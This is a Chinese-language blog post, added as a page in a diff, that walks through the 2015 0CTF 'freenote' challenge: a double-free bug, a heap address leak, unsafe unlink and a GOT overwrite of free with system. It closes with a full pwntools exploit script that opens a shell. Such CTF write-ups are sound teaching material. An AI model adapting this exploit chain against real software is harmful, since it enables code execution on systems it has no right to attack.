@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="这道题的堆指针没有清空，导致释放堆内存后仍然指针任然指向堆，由于释放指针没有有效性检查，经过再次申请重新利用释放掉的内存，可以再将原来释放的堆指针再次释放。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2015 0ctf freenote writeup">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/10/03/2015-0ctf-freenote-writeup/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="这道题的堆指针没有清空，导致释放堆内存后仍然指针任然指向堆，由于释放指针没有有效性检查，经过再次申请重新利用释放掉的内存，可以再将原来释放的堆指针再次释放。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-10-03T08:26:40.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.862Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="double free">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/10/03/2015-0ctf-freenote-writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/10/03/2015-0ctf-freenote-writeup/","path":"2017/10/03/2015-0ctf-freenote-writeup/","title":"2015 0ctf freenote writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2015 0ctf freenote writeup | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#unlink"><span class="nav-number">1.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80"><span class="nav-number">2.</span> <span class="nav-text">泄露堆地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#double-free%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">double free思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/10/03/2015-0ctf-freenote-writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2015 0ctf freenote writeup | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2015 0ctf freenote writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-10-03 16:26:40" itemprop="dateCreated datePublished" datetime="2017-10-03T16:26:40+08:00">2017-10-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>这道题的堆指针没有清空，导致释放堆内存后仍然指针任然指向堆，由于释放指针没有有效性检查，经过再次申请重新利用释放掉的内存，可以再将原来释放的堆指针再次释放。
+<span id="more"></span> # 分析 拿到这道题，先看软件开启了什么保护。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>64位小端对齐程序，开启了<code>canary</code>和<code>NX</code>保护，运行程序发现程序有如下功能。</p>
+<pre><code>== 0ops Free Note ==
+1. List Note
+2. New Note
+3. Edit Note
+4. Delete Note
+5. Exit
+====================</code></pre>
+<p>将程序拖入IDA中，很快定位漏洞位置。在操作<code>4</code>中，<code>free</code>堆内存后并没有将指针置<code>NULL</code>。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &gt;= 0 &amp;&amp; (signed __int64)v1 &lt; *(_QWORD *)qword_6020A8 )</span><br><span class="line">    &#123;</span><br><span class="line">      --*(_QWORD *)(qword_6020A8 + 8);</span><br><span class="line">      *(_QWORD *)(qword_6020A8 + 24LL * v1 + 16) = 0LL;</span><br><span class="line">      *(_QWORD *)(qword_6020A8 + 24LL * v1 + 24) = 0LL;</span><br><span class="line">      free(*(void **)(qword_6020A8 + 24LL * v1 + 32));</span><br><span class="line">      result = puts(&quot;Done.&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>要理解程序，需要理解全局变量<code>qword_6020A8</code>。它的初始化在<code>sub_400A49</code>中。<code>qword_6020A8</code>是个指针，指向了0x1810大小的内存。
+第一个元素保存256，从循环看，这个应该是256个最大值的意思。
+第二个元素保存存储note的数量。
+之后是每个note的结构体信息，每个结构体24字节，第一个标记变量note[i]-&gt;flag，1表示有效，0表示无效；第二个保存note的长度note[i]-&gt;length；第三个保存note的指针note[i]-&gt;str，通过<code>malloc</code>申请内存，最小128，最大4096长度。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *sub_400A49()</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v0; // rax@1</span><br><span class="line">  _QWORD *result; // rax@1</span><br><span class="line">  signed int i; // [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  v0 = malloc(0x1810uLL);</span><br><span class="line">  qword_6020A8 = (__int64)v0;</span><br><span class="line">  *v0 = 256LL;</span><br><span class="line">  result = (_QWORD *)qword_6020A8;</span><br><span class="line">  *(_QWORD *)(qword_6020A8 + 8) = 0LL;</span><br><span class="line">  for ( i = 0; i &lt;= 255; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)(qword_6020A8 + 24LL * i + 16) = 0LL;</span><br><span class="line">    *(_QWORD *)(qword_6020A8 + 24LL * i + 24) = 0LL;</span><br><span class="line">    result = (_QWORD *)(qword_6020A8 + 24LL * i + 32);</span><br><span class="line">    *result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h1 id="unlink">unlink</h1>
+<p>可以通过我博客里面的<code>unsafe unlink</code>来达到任意地址的读写。这时候需要一个全局指针来作为<code>victim</code>。前文分析到，note[i]-&gt;str指向了堆，而且note[i]还保存在堆上,所以有必要泄露堆地址来获取victim。</p>
+<h1 id="泄露堆地址">泄露堆地址</h1>
+<p>由于字符串读入时，没有补<code>\0</code>，所以输出时可以一直把后面的内容打印出来。可以申请多个<code>small chunk</code>的堆并释放其中几个，几个small
+chunk保存在unsorted
+bins内，让某个freed的chunk（比如A）的bk指向另一个freed
+chunk（比如B）,然后重新申请A的大小内存，将A块从unsorted
+bins中释放出来，再次打印A块的内容即可泄露堆内存地址。</p>
+<p>这里我学到了一个新的gdb命令，<code>vmmap</code>来展示整个内存空间的映射。找到heap一栏，堆内存的起始地址可以查找。</p>
+<h1 id="double-free思路">double free思路</h1>
+<ol type="1">
+<li>先连续申请4个0x80字节的堆内存，分别计为note0，note1，note2，note3。chunk大小为0x90。</li>
+<li>先释放note0，再释放note2，分隔释放防止堆块合并。</li>
+<li>重新申请0x80，内容少于8字节，不要覆盖bk指针，可以获取到note0。然后打印note0的内容可以leak堆地址，进而推算出note[i]-&gt;str地址。我这里取note[0]-&gt;str,
+因为note[0]-&gt;str = note0。</li>
+<li>将note0,note1,note3释放掉。</li>
+<li>然后我们申请3个note,分别记为n_note0, n_note1,
+n_note2。因为我们要再次free note3。</li>
+<li>利用unsafe
+unlink重新构造n_note0,n_note1,n_note2。具体如何构造，参见<a
+target="_blank" rel="noopener" href="http://rk700.github.io/2015/04/21/0ctf-freenote/"
+class="uri">http://rk700.github.io/2015/04/21/0ctf-freenote/</a></li>
+<li>再次释放note3，拿到note[0]-&gt;str，其指向了比它低3个地址长度的地址。</li>
+<li>先利用victim指针指向free的got地址，泄露其在内存中加载的地址。</li>
+<li>利用libc中free与system相对便宜地址，计算system在内存中加载的地址。</li>
+<li>将system内存地址存入free的got表中，覆盖free内存地址。</li>
+<li>将/bin/sh写入note中，free掉此note，相当于执行了system('bin/sh')。PWN!</li>
+</ol>
+<h1 id="总结">总结</h1>
+<ol type="1">
+<li><code>vmmap</code>常用，可以方便的查看包括堆内存分配情况。</li>
+<li>pwntools工具中关于<code>recv</code>函数，有个参数<code>keepends</code>表示接受行是否保留0a，有时候不需要换行符<code>\n</code>，可以将其置为<code>False</code>。</li>
+<li>unsafe unlink熟练运用，达到任意地址读和写的目的。</li>
+</ol>
+<h1 id="代码">代码</h1>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">debug=True</span><br><span class="line">p = process(&#x27;./freenote&#x27;)</span><br><span class="line">if debug:</span><br><span class="line">    #context.log_level=&quot;debug&quot;</span><br><span class="line">    libc = p.libc</span><br><span class="line">    # breakpoint: list note,</span><br><span class="line">    gdb.attach(p, &#x27;b*0x0000000000400B96&#x27;)</span><br><span class="line">else:</span><br><span class="line">    libc=ELF(&#x27;./libc.so.6_1&#x27;)</span><br><span class="line">def new_note(content):</span><br><span class="line">    p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Length of new note: &#x27;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&#x27;Enter your note: &#x27;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line">def list_note(index=0):</span><br><span class="line">    p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    p.recvuntil(str(index)+&#x27;. &#x27;)</span><br><span class="line">    # keepends can remove \x0a</span><br><span class="line">    return p.recvline(keepends=False)</span><br><span class="line"></span><br><span class="line">def delete_note(index):</span><br><span class="line">    p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Note number: &#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit_note(index, content):</span><br><span class="line">    p.recvuntil(&#x27;Your choice: &#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;Note number: &#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#x27;Length of note: &#x27;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&#x27;Enter your note: &#x27;)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># new 4 notes</span><br><span class="line"># 0x90+0x90+0x90+0x90</span><br><span class="line">for i in range(0,4):</span><br><span class="line">    new_note(&#x27;A&#x27;)</span><br><span class="line"></span><br><span class="line">delete_note(0)</span><br><span class="line">delete_note(2)</span><br><span class="line"># leak note 2 address</span><br><span class="line">new_note(&#x27;12345678&#x27;)</span><br><span class="line">#heap_note2 = u64(list_note(0)[8:])</span><br><span class="line">addr_half = list_note(0)[8:]</span><br><span class="line">heap_note2 = u64(addr_half.ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">log.success(&quot;note 2 is at %#x&quot;%heap_note2)</span><br><span class="line">heap_addr = heap_note2-0x90-0x90-0x1820+0x10</span><br><span class="line">log.success(&quot;heap is at %#x&quot;%heap_addr)</span><br><span class="line"></span><br><span class="line"># construct false heap</span><br><span class="line">delete_note(0)</span><br><span class="line">delete_note(1)</span><br><span class="line">delete_note(3)</span><br><span class="line">ptr0 = heap_addr+ 32</span><br><span class="line"># fake note0</span><br><span class="line"># 0</span><br><span class="line"># payload0size = 0x80+0x90+0x90</span><br><span class="line"># fd= ptr0-0x18</span><br><span class="line"># bk= ptr0-0x10</span><br><span class="line"># padding, size = 0x80+0x90+0x90-0x20</span><br><span class="line"># prev_payload0size</span><br><span class="line"># 0x90</span><br><span class="line"># padding, size=0x80</span><br><span class="line"># prev_size=0</span><br><span class="line"># 0x91</span><br><span class="line"># padding, size=0x80</span><br><span class="line">payload0size = 0x80+0x90+0x90</span><br><span class="line">payload0 = p64(0)+ p64(payload0size|1)+ p64(ptr0-0x18)+p64(ptr0-0x10)</span><br><span class="line">payload2 = &#x27;A&#x27;*0x80 + p64(payload0size)+p64(0x90)+&#x27;A&#x27;*0x80+\</span><br><span class="line">        (p64(0)+p64(0x91)+&#x27;A&#x27;*0x80)*2</span><br><span class="line">new_note(payload0)# note0</span><br><span class="line">payload1 = &#x27;/bin/sh\x00&#x27;</span><br><span class="line">new_note(payload1)# note1</span><br><span class="line">new_note(payload2)</span><br><span class="line"># just for debug</span><br><span class="line">#list_note(0)</span><br><span class="line"></span><br><span class="line">delete_note(3)</span><br><span class="line"># get system addr</span><br><span class="line"># 0000000000602018 R_X86_64_JUMP_SLOT  free</span><br><span class="line">free_got = 0x602018</span><br><span class="line">payload = p64(10)+p64(1)+p64(8)+p64(free_got)</span><br><span class="line"></span><br><span class="line">edit_note(0, payload)</span><br><span class="line">free_addr = u64(list_note(0).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">log.success(&#x27;free address is at %#x&#x27;%free_addr )</span><br><span class="line"></span><br><span class="line">system_addr = free_addr + libc.symbols[&#x27;system&#x27;]-libc.symbols[&#x27;free&#x27;]</span><br><span class="line"></span><br><span class="line">edit_note(0, p64(system_addr))</span><br><span class="line">delete_note(1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="参考">参考</h1>
+<p>[1] <a
+target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/latest/commands/vmmap/">Command
+vmmap</a> [2] <a
+target="_blank" rel="noopener" href="http://rk700.github.io/2015/04/21/0ctf-freenote/">0CTF
+freenote</a> [3] <a
+target="_blank" rel="noopener" href="http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up">0ctf
+2015 Freenote Write Up</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/double-free/" rel="tag"># double free</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2017/10/01/pwnable-tw%E4%B9%8Bcalc/" rel="prev" title="pwnable.tw之calc">
+                  <i class="fa fa-angle-left"></i> pwnable.tw之calc
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2017/10/04/vim%E6%93%8D%E4%BD%9C/" rel="next" title="vim操作">
+                  vim操作 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
